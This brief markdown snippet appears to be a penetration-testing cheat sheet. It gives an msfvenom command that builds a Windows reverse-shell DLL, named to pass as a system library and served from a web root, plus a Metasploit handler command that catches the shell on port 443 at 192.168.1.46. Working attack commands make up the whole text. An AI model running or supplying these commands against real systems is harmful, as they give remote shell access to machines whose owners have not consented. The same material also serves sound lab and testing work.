### payload

* `mswin.dll` genetrate dll payload 
  
  ```command
  msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f dll > /var/www/html/msin.dll
  ```
  
  ### listener
  
  ```bash
  msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/shell/reverse_tcp; exploit"
  ```
